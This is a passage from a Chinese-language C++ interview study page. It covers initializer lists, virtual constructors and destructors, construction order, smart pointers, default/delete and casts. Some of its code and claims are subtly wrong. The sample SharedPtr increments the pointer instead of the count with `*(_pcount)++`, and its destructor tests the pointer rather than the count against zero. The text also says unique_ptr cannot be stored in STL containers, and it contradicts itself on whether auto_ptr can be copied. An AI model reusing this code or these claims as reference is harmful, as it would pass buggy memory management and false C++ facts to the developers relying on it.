std<span class="token punctuation">;</span>class A<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    <span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"默认构造函数A()"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">A</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        value <span class="token operator">=</span> a<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"A(int "</span><span class="token operator">&lt;&lt;</span>value<span class="token operator">&lt;&lt;</span><span class="token string">")"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">A</span><span class="token punctuation">(</span><span class="token keyword">const</span> A<span class="token operator">&amp;</span> a<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        value <span class="token operator">=</span> a<span class="token punctuation">.</span>value<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"拷贝构造函数A(A&amp; a):  "</span><span class="token operator">&lt;&lt;</span>value <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class B<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    <span class="token function">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        b <span class="token operator">=</span> <span class="token function">A</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    A a<span class="token punctuation">;</span>    A b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    B b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//输出结果：</span><span class="token comment">//A(int 1)</span><span class="token comment">//默认构造函数A()</span><span class="token comment">//A(int 2)</span></code></pre><p>从代码运行结果可以看出，在构造函数体内部初始化的对象b多了一次构造函数的调用过程，而对象a则没有。由于对象成员变量的初始化动作发生在进入构造函数之前，对于内置类型没什么影响，但<strong>如果有些成员是类</strong>，那么在进入构造函数之前，会先调用一次默认构造函数，进入构造函数后所做的事其实是一次赋值操作(对象已存在)，所以<strong>如果是在构造函数体内进行赋值的话，等于是一次默认构造加一次赋值，而初始化列表只做一次赋值操作。</strong></p><blockquote><p>《为什么用成员初始化列表会快一些？》：<a href="https://blog.csdn.net/JackZhang_123/article/details/82590368">https://blog.csdn.net/JackZhang_123/article/details/82590368</a></p></blockquote><h4 id="75、-超重要-构造函数为什么不能为虚函数？析构函数为什么要虚函数？"><a href="#75、-超重要-构造函数为什么不能为虚函数？析构函数为什么要虚函数？" class="headerlink" title="75、(超重要)构造函数为什么不能为虚函数？析构函数为什么要虚函数？"></a>75、(超重要)构造函数为什么不能为虚函数？析构函数为什么要虚函数？</h4><p><strong>1、 从存储空间角度，</strong>虚函数相应一个指向vtable虚函数表的指针，这大家都知道，但是这个指向vtable的指针事实上是存储在对象的内存空间的。</p><p>问题出来了，假设构造函数是虚的，就须要通过 vtable来调用，但是对象还没有实例化，也就是内存空间还没有，怎么找vtable呢？所以构造函数不能是虚函数。</p><p><strong>2、 从使用角度，</strong>虚函数主要用于在信息不全的情况下，能使重载的函数得到相应的调用。</p><p>构造函数本身就是要初始化实例，那使用虚函数也没有实际意义呀。</p><p>所以构造函数没有必要是虚函数。虚函数的作用在于通过父类的指针或者引用来调用它的时候可以变成调用子类的那个成员函数。而构造函数是在创建对象时自己主动调用的，不可能通过父类的指针或者引用去调用，因此也就规定构造函数不能是虚函数。</p><p><strong>3、构造函数不须要是虚函数，也不同意是虚函数，</strong>由于创建一个对象时我们总是要明白指定对象的类型，虽然我们可能通过实验室的基类的指针或引用去訪问它但析构却不一定，我们往往通过基类的指针来销毁对象。这时候假设析构函数不是虚函数，就不能正确识别对象类型从而不能正确调用析构函数。</p><p><strong>4、从实现上看，</strong>vbtl在构造函数调用后才建立，因而构造函数不可能成为虚函数从实际含义上看，在调用构造函数时还不能确定对象的真实类型（由于子类会调父类的构造函数）；并且构造函数的作用是提供初始化，在对象生命期仅仅运行一次，不是对象的动态行为，也没有必要成为虚函数。</p><p><strong>5、当一个构造函数被调用时，它做的首要的事情之中的一个是初始化它的VPTR。</strong></p><p>因此，它仅仅能知道它是“当前”类的，而全然忽视这个对象后面是否还有继承者。当编译器为这个构造函数产生代码时，它是为这个类的构造函数产生代码——既不是为基类，也不是为它的派生类（由于类不知道谁继承它）。所以它使用的VPTR必须是对于这个类的VTABLE。</p><p>并且，仅仅要它是最后的构造函数调用，那么在这个对象的生命期内，VPTR将保持被初始化为指向这个VTABLE, 但假设接着另一个更晚派生的构造函数被调用，这个构造函数又将设置VPTR指向它的 VTABLE，等.直到最后的构造函数结束。</p><p>VPTR的状态是由被最后调用的构造函数确定的。这就是为什么构造函数调用是从基类到更加派生类顺序的还有一个理由。可是，当这一系列构造函数调用正发生时，每一个构造函数都已经设置VPTR指向它自己的VTABLE。假设函数调用使用虚机制，它将仅仅产生通过它自己的VTABLE的调用，而不是最后的VTABLE（全部构造函数被调用后才会有最后的VTABLE）。</p><p>因为构造函数本来就是为了明确初始化对象成员才产生的，然而virtual function主要是为了再不完全了解细节的情况下也能正确处理对象。另外，virtual函数是在不同类型的对象产生不同的动作，现在对象还没有产生，如何使用virtual函数来完成你想完成的动作。</p><p>直接的讲，c中基类采用virtual虚析构函数是<strong>为了防止内存泄漏。</strong></p><p>具体地说，如果派生类中申请了内存空间，并在其析构函数中对这些内存空间进行释放。假设基类中采用的是非虚析构函数，当删除基类指针指向的派生类对象时就不会触发动态绑定，因而只会调用基类的析构函数，而不会调用派生类的析构函数。那么在这种情况下，派生类中申请的空间就得不到释放从而产生内存泄漏。</p><p>所以，为了防止这种情况的发生，c中基类的析构函数应采用virtual虚析构函数。</p><h4 id="76、析构函数的作用，如何起作用？"><a href="#76、析构函数的作用，如何起作用？" class="headerlink" title="76、析构函数的作用，如何起作用？"></a>76、析构函数的作用，如何起作用？</h4><p>1)  构造函数只是起初始化值的作用，但实例化一个对象的时候，可以通过实例去传递参数，从主函数传递到其他的函数里面，这样就使其他的函数里面有值了。</p><p>规则，只要你一实例化对象，系统自动回调用一个构造函数就是你不写，编译器也自动调用一次。 </p><p>2)  析构函数与构造函数的作用相反，用于撤销对象的一些特殊任务处理，可以是释放对象分配的内存空间；特点：析构函数与构造函数同名，但该函数前面加~。 </p><p>析构函数没有参数，也没有返回值，而且不能重载，在一个类中只能有一个析构函数。 当撤销对象时，编译器也会自动调用析构函数。</p><p>每一个类必须有一个析构函数，用户可以自定义析构函数，也可以是编译器自动生成默认的析构函数。一般析构函数定义为类的公有成员。</p><h4 id="77、构造函数和析构函数可以调用虚函数吗，为什么"><a href="#77、构造函数和析构函数可以调用虚函数吗，为什么" class="headerlink" title="77、构造函数和析构函数可以调用虚函数吗，为什么"></a>77、构造函数和析构函数可以调用虚函数吗，为什么</h4><p>1) 在c中，提倡不在构造函数和析构函数中调用虚函数；</p><p>2) 构造函数和析构函数调用虚函数时都不使用动态联编，如果在构造函数或析构函数中调用虚函数，则运行的是为构造函数或析构函数自身类型定义的版本；</p><p>3) 因为父类对象会在子类之前进行构造，此时子类部分的数据成员还未初始化，因此调用子类的虚函数时不安全的，故而c不会进行动态联编；</p><p>4) 析构函数是用来销毁一个对象的，在销毁一个对象时，先调用子类的析构函数，然后再调用基类的析构函数。所以在调用基类的析构函数时，派生类对象的数据成员已经销毁，这个时候再调用子类的虚函数没有任何意义。</p><h4 id="78、构造函数、析构函数的执行顺序？构造函数和拷贝构造的内部都干了啥？"><a href="#78、构造函数、析构函数的执行顺序？构造函数和拷贝构造的内部都干了啥？" class="headerlink" title="78、构造函数、析构函数的执行顺序？构造函数和拷贝构造的内部都干了啥？"></a>78、构造函数、析构函数的执行顺序？构造函数和拷贝构造的内部都干了啥？</h4><p><strong>1)     构造函数顺序</strong></p><p>①   基类构造函数。如果有多个基类，则构造函数的调用顺序是某类在类派生表中出现的顺序，而不是它们在成员初始化表中的顺序。</p><p>②   成员类对象构造函数。如果有多个成员类对象则构造函数的调用顺序是对象在类中被声明的顺序，而不是它们出现在成员初始化表中的顺序。</p><p>③   派生类构造函数。</p><p><strong>2)     析构函数顺序</strong></p><p>①   调用派生类的析构函数；</p><p>②   调用成员类对象的析构函数；</p><p>③   调用基类的析构函数。</p><h4 id="79、虚析构函数的作用，父类的析构函数是否要设置为虚函数？"><a href="#79、虚析构函数的作用，父类的析构函数是否要设置为虚函数？" class="headerlink" title="79、虚析构函数的作用，父类的析构函数是否要设置为虚函数？"></a>79、虚析构函数的作用，父类的析构函数是否要设置为虚函数？</h4><p>1)  c中基类采用virtual虚析构函数是为了防止内存泄漏。</p><p>具体地说，如果派生类中申请了内存空间，并在其析构函数中对这些内存空间进行释放。</p><p>假设基类中采用的是非虚析构函数，当删除基类指针指向的派生类对象时就不会触发动态绑定，因而只会调用基类的析构函数，而不会调用派生类的析构函数。</p><p>那么在这种情况下，派生类中申请的空间就得不到释放从而产生内存泄漏。</p><p>所以，为了防止这种情况的发生，c中基类的析构函数应采用virtual虚析构函数。</p><p>2)  纯虚析构函数一定得定义，因为每一个派生类析构函数会被编译器加以扩张，以静态调用的方式调用其每一个虚基类以及上一层基类的析构函数。</p><p>因此，缺乏任何一个基类析构函数的定义，就会导致链接失败，最好不要把虚析构函数定义为纯虚析构函数。</p><h4 id="80、构造函数析构函数可否抛出异常"><a href="#80、构造函数析构函数可否抛出异常" class="headerlink" title="80、构造函数析构函数可否抛出异常"></a>80、构造函数析构函数可否抛出异常</h4><p>1)   c只会析构已经完成的对象，对象只有在其构造函数执行完毕才算是完全构造妥当。在构造函数中发生异常，控制权转出构造函数之外。</p><p>因此，在对象b的构造函数中发生异常，对象b的析构函数不会被调用。因此会造成内存泄漏。</p><p>2)  用auto_ptr对象来取代指针类成员，便对构造函数做了强化，免除了抛出异常时发生资源泄漏的危机，不再需要在析构函数中手动释放资源；</p><p>3)  如果控制权基于异常的因素离开析构函数，而此时正有另一个异常处于作用状态，c会调用terminate函数让程序结束；</p><p>4)  如果异常从析构函数抛出，而且没有在当地进行捕捉，那个析构函数便是执行不全的。如果析构函数执行不全，就是没有完成他应该执行的每一件事情。</p><h4 id="81、构造函数一般不定义为虚函数的原因"><a href="#81、构造函数一般不定义为虚函数的原因" class="headerlink" title="81、构造函数一般不定义为虚函数的原因"></a>81、构造函数一般不定义为虚函数的原因</h4><p>（1）创建一个对象时需要确定对象的类型，而虚函数是在运行时动态确定其类型的。在构造一个对象时，由于对象还未创建成功，编译器无法知道对象的实际类型</p><p>（2）虚函数的调用需要虚函数表指针vptr，而该指针存放在对象的内存空间中，若构造函数声明为虚函数，那么由于对象还未创建，还没有内存空间，更没有虚函数表vtable地址用来调用虚构造函数了</p><p>（3）虚函数的作用在于通过父类的指针或者引用调用它的时候能够变成调用子类的那个成员函数。而构造函数是在创建对象时自动调用的，不可能通过父类或者引用去调用，因此就规定构造函数不能是虚函数</p><p>（4）析构函数一般都要声明为虚函数，这个应该是老生常谈了，这里不再赘述</p><blockquote><p>《为什么c不能有虚构造函数，却可以有虚析构函数》：<a href="https://dwz.cn/lnfW9H6m">https://dwz.cn/lnfW9H6m</a></p></blockquote><h4 id="82、类什么时候会析构？"><a href="#82、类什么时候会析构？" class="headerlink" title="82、类什么时候会析构？"></a>82、类什么时候会析构？</h4><p>1)  对象生命周期结束，被销毁时；</p><p>2)  delete指向对象的指针时，或delete指向对象的基类类型指针，而其基类虚构函数是虚函数时；</p><p>3)  对象i是对象o的成员，o的析构函数被调用时，对象i的析构函数也被调用。</p><h4 id="83、构造函数或者析构函数中可以调用虚函数吗"><a href="#83、构造函数或者析构函数中可以调用虚函数吗" class="headerlink" title="83、构造函数或者析构函数中可以调用虚函数吗"></a>83、构造函数或者析构函数中可以调用虚函数吗</h4><p>简要结论：</p><ul><li>从语法上讲，调用完全没有问题。</li><li>但是从效果上看，往往不能达到需要的目的。 </li></ul><blockquote><p>《Effective c》的解释是：<br>派生类对象构造期间进入基类的构造函数时，对象类型变成了基类类型，而不是派生类类型。 同样，进入基类析构函数时，对象也是基类类型。</p></blockquote><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>class Base<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    <span class="token function">Base</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>       <span class="token function">Function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    virtual <span class="token keyword">void</span> <span class="token function">Function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Base::Fuction"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token operator">~</span><span class="token function">Base</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">Function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class A <span class="token operator">:</span> public Base<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    <span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">Function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    virtual <span class="token keyword">void</span> <span class="token function">Function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"A::Function"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token operator">~</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">Function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Base<span class="token operator">*</span> a <span class="token operator">=</span> new Base<span class="token punctuation">;</span>delete a<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"-------------------------"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>Base<span class="token operator">*</span> b <span class="token operator">=</span> new A<span class="token punctuation">;</span><span class="token comment">//语句1</span>delete b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//输出结果</span><span class="token comment">//Base::Fuction</span><span class="token comment">//Base::Fuction</span><span class="token comment">//-------------------------</span><span class="token comment">//Base::Fuction</span><span class="token comment">//A::Function</span><span class="token comment">//Base::Fuction</span></code></pre><p>语句1讲道理应该体现多态性，执行类A中的构造和析构函数，从实验结果来看，语句1并没有体现，执行流程是先构造基类，所以先调用基类的构造函数，构造完成再执行A自己的构造函数，析构时也是调用基类的析构函数，也就是说构造和析构中调用虚函数并不能达到目的，应该避免</p><blockquote><p>《构造函数或者析构函数中调用虚函数会怎么样？》：<a href="https://dwz.cn/TaJTJONX">https://dwz.cn/TaJTJONX</a></p></blockquote><h4 id="84、智能指针的原理、常用的智能指针及实现"><a href="#84、智能指针的原理、常用的智能指针及实现" class="headerlink" title="84、智能指针的原理、常用的智能指针及实现"></a>84、智能指针的原理、常用的智能指针及实现</h4><p><strong>原理</strong></p><p>智能指针是一个类，用来存储指向动态分配对象的指针，负责自动释放动态分配的对象，防止堆内存泄漏。动态分配的资源，交给一个类对象去管理，当类对象声明周期结束时，自动调用析构函数释放资源</p><p><strong>常用的智能指针</strong></p><p><strong>(1) shared_ptr</strong> </p><p>实现原理：采用引用计数器的方法，允许多个智能指针指向同一个对象，每当多一个指针指向该对象时，指向该对象的所有智能指针内部的引用计数加1，每当减少一个智能指针指向对象时，引用计数会减1，当计数为0的时候会自动的释放动态分配的资源。 </p><ul><li>智能指针将一个计数器与类指向的对象相关联，引用计数器跟踪共有多少个类对象共享同一指针</li><li>每次创建类的新对象时，初始化指针并将引用计数置为1</li><li>当对象作为另一对象的副本而创建时，拷贝构造函数拷贝指针并增加与之相应的引用计数</li><li>对一个对象进行赋值时，赋值操作符减少左操作数所指对象的引用计数（如果引用计数为减至0，则删除对象），并增加右操作数所指对象的引用计数</li><li>调用析构函数时，构造函数减少引用计数（如果引用计数减至0，则删除基础对象）</li></ul><p><strong>(2) unique_ptr</strong> </p><p>unique_ptr采用的是独享所有权语义，一个非空的unique_ptr总是拥有它所指向的资源。转移一个unique_ptr将会把所有权全部从源指针转移给目标指针，源指针被置空；所以unique_ptr不支持普通的拷贝和赋值操作，不能用在STL标准容器中；局部变量的返回值除外（因为编译器知道要返回的对象将要被销毁）；如果你拷贝一个unique_ptr，那么拷贝结束后，这两个unique_ptr都会指向相同的资源，造成在结束时对同一内存指针多次释放而导致程序崩溃。</p><p><strong>(3) weak_ptr</strong> </p><p>weak_ptr：弱引用。 引用计数有一个问题就是互相引用形成环（环形引用），这样两个指针指向的内存都无法释放。需要使用weak_ptr打破环形引用。weak_ptr是一个弱引用，它是为了配合shared_ptr而引入的一种智能指针，它指向一个由shared_ptr管理的对象而不影响所指对象的生命周期，也就是说，它只引用，不计数。如果一块内存被shared_ptr和weak_ptr同时引用，当所有shared_ptr析构了之后，不管还有没有weak_ptr引用该内存，内存也会被释放。所以weak_ptr不保证它指向的内存一定是有效的，在使用之前使用函数lock()检查weak_ptr是否为空指针。</p><p><strong>(4) auto_ptr</strong> </p><p> 主要是为了解决“有异常抛出时发生内存泄漏”的问题 。因为发生异常而无法正常释放内存。</p><p>auto_ptr有拷贝语义，拷贝后源对象变得无效，这可能引发很严重的问题；而unique_ptr则无拷贝语义，但提供了移动语义，这样的错误不再可能发生，因为很明显必须使用std::move()进行转移。</p><p>auto_ptr不支持拷贝和赋值操作，不能用在STL标准容器中。STL容器中的元素经常要支持拷贝、赋值操作，在这过程中auto_ptr会传递所有权，所以不能在STL中使用。</p><p><strong>智能指针shared_ptr代码实现：</strong></p><pre class="language-c" data-language="c"><code class="language-c">template<span class="token operator">&lt;</span>typename T<span class="token operator">></span>class SharedPtr<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token function">SharedPtr</span><span class="token punctuation">(</span>T<span class="token operator">*</span> ptr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">_ptr</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">_pcount</span><span class="token punctuation">(</span>new <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token function">SharedPtr</span><span class="token punctuation">(</span><span class="token keyword">const</span> SharedPtr<span class="token operator">&amp;</span> s<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">_ptr</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>_ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">_pcount</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>_pcount<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span><span class="token punctuation">(</span>_pcount<span class="token punctuation">)</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>SharedPtr<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token operator">&amp;</span> operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> SharedPtr<span class="token operator">&amp;</span> s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>this <span class="token operator">!=</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">--</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>this<span class="token operator">-></span>_pcount<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>delete this<span class="token operator">-></span>_ptr<span class="token punctuation">;</span>delete this<span class="token operator">-></span>_pcount<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>_ptr <span class="token operator">=</span> s<span class="token punctuation">.</span>_ptr<span class="token punctuation">;</span>_pcount <span class="token operator">=</span> s<span class="token punctuation">.</span>_pcount<span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span>_pcount<span class="token punctuation">)</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>T<span class="token operator">&amp;</span> operator<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span>this<span class="token operator">-></span>_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>T<span class="token operator">*</span> operator<span class="token operator">-></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> this<span class="token operator">-></span>_ptr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">~</span><span class="token function">SharedPtr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>this<span class="token operator">-></span>_pcount<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>this<span class="token operator">-></span>_pcount <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>delete _ptr<span class="token punctuation">;</span>_ptr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>delete _pcount<span class="token punctuation">;</span>_pcount <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>private<span class="token operator">:</span>T<span class="token operator">*</span> _ptr<span class="token punctuation">;</span><span class="token keyword">int</span><span class="token operator">*</span> _pcount<span class="token punctuation">;</span><span class="token comment">//指向引用计数的指针</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><blockquote><p>《智能指针的原理及实现》：<a href="https://blog.csdn.net/lizhentao0707/article/details/81156384">https://blog.csdn.net/lizhentao0707/article/details/81156384</a></p></blockquote><h4 id="85、构造函数的几种关键字"><a href="#85、构造函数的几种关键字" class="headerlink" title="85、构造函数的几种关键字"></a>85、构造函数的几种关键字</h4><p><strong>default</strong></p><p>default关键字可以显式要求编译器生成合成构造函数，防止在调用时相关构造函数类型没有定义而报错</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>class CString<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    <span class="token function">CString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">default</span><span class="token punctuation">;</span> <span class="token comment">//语句1</span>    <span class="token comment">//构造函数</span>    <span class="token function">CString</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> pstr<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">_str</span><span class="token punctuation">(</span>pstr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">void</span><span class="token operator">*</span> operator <span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> delete<span class="token punctuation">;</span><span class="token comment">//这样不允许使用new关键字</span>    <span class="token comment">//析构函数</span>    <span class="token operator">~</span><span class="token function">CString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>public<span class="token operator">:</span>     string _str<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">auto</span> a <span class="token operator">=</span> new <span class="token function">CString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//语句2</span>   cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Hello World"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//运行结果</span><span class="token comment">//Hello World</span></code></pre><p>如果没有加语句1，语句2会报错，表示找不到参数为空的构造函数，将其设置为default可以解决这个问题</p><p><strong>delete</strong></p><p>delete关键字可以删除构造函数、赋值运算符函数等，这样在使用的时候会得到友善的提示</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>class CString<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    <span class="token keyword">void</span><span class="token operator">*</span> operator <span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> delete<span class="token punctuation">;</span><span class="token comment">//这样不允许使用new关键字</span>    <span class="token comment">//析构函数</span>    <span class="token operator">~</span><span class="token function">CString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">auto</span> a <span class="token operator">=</span> new <span class="token function">CString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//语句1</span>   cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Hello World"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>在执行语句1时，会提示new方法已经被删除，如果将new设置为私有方法，则会报惨不忍睹的错误，因此使用delete关键字可以更加人性化的删除一些默认方法</p><p><strong>0</strong></p><p>将虚函数定义为纯虚函数（纯虚函数无需定义，= 0只能出现在类内部虚函数的声明语句处；当然，也可以为纯虚函数提供定义，不过函数体必须定义在类的外部）</p><blockquote><p>《c构造函数的default和delete》：<a href="https://blog.csdn.net/u010591680/article/details/71101737">https://blog.csdn.net/u010591680/article/details/71101737</a></p></blockquote><h4 id="86、c的四种强制转换reinterpret-cast-const-cast-static-cast-dynamic-cast"><a href="#86、c的四种强制转换reinterpret-cast-const-cast-static-cast-dynamic-cast" class="headerlink" title="86、c的四种强制转换reinterpret_cast/const_cast/static_cast /dynamic_cast"></a>86、c的四种强制转换reinterpret_cast/const_cast/static_cast /dynamic_cast</h4><p><strong>reinterpret_cast</strong></p><p>reinterpret_cast<type-id> (expression)</p><p>type-id 必须是一个指针、引用、算术类型、函数指针或者成员指针。它可以用于类型之间进行强制转换。</p><p><strong>const_cast</strong></p><p>const_cast<type_id> (expression)</p><p>该运算符用来修改类型的const或volatile属性。除了const 或volatile修饰之外， type_id和expression的类型是一样的。用法如下：</p><ul><li><p>常量指针被转化成非常量的指针，并且仍然指向原来的对象</p></li><li><p>常量引用被转换成非常量的引用，并且仍然指向原来的对象</p></li><li><p>const_cast一般用于修改底指针。如const char *p形式</p></li></ul><p><strong>static_cast</strong></p><p>static_cast &lt; type-id &gt; 